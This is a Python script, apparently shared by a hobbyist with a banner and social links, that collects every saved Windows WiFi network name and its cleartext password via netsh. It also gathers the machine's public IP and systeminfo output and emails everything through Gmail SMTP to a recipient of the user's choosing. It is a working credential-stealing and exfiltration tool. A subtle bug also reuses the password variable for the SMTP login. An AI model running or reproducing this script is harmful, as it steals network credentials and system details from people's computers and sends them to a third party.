print( '''░██████╗██████╗░░█████╗░░█████╗░██████╗░████████╗░██████╗\n
██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝\n
╚█████╗░██████╔╝██║░░██║██║░░██║██████╔╝░░░██║░░░╚█████╗░\n
░╚═══██╗██╔═══╝░██║░░██║██║░░██║██╔══██╗░░░██║░░░░╚═══██╗\n
██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░░██║░░░██║░░░██████╔╝\n
╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░\n
 GitHub - https://github.com/sportstopmboy\n
 Anonymous Awareness - https://bit.ly/anonymousawareness\n
 Discord - spoorts#1167\n
 Steam - https://steamcommunity.com/id/sports_top_mboy\n''')

# Import all the libraries
import subprocess
import re
import smtplib
from email.message import EmailMessage

# Makes sure login is provided
username = input("Username:\n")
password = input("Password:\n")

# Get all WiFi networks
output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

names = (re.findall("All User Profile     : (.*)\r", output))

wifi_list = list()

# Get passwords of the WiFi networks
if len(names) != 0:
    for name in names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password is None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)

# Get IP address
ip = subprocess.run(["curl", "ident.me"], capture_output=True).stdout.decode()

# Get system information
sysinfo = subprocess.run(["systeminfo"], capture_output=True).stdout.decode()

# Compile email message
message = ""
for item in wifi_list:
    message += f"**WiFi Networks & Passwords**\n"
    message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
    message += f"--------------------------------------------------------------------\n"
    message += f"**IP Address**\n"
    message += f"Public IP: {ip}\n"
    message += f"--------------------------------------------------------------------\n"
    message += f"**Other System Information**\n"
    message += f"{sysinfo}\n"

# Compile 'from', 'to' & 'subject' information
email = EmailMessage()
email["from"] = "dummy gmail account"
# ↑ replace with dummy gmail account address
email["to"] = "email you want to send the message to"
# ↑ replace with the email account address you want the information to be sent to
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(message)

# Send email
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.login(username, password)
    # ↑ replace with login credentials (remember to enable IMAP in gmail settings and enable less secure app access in google account settings)
    smtp.send_message(email)
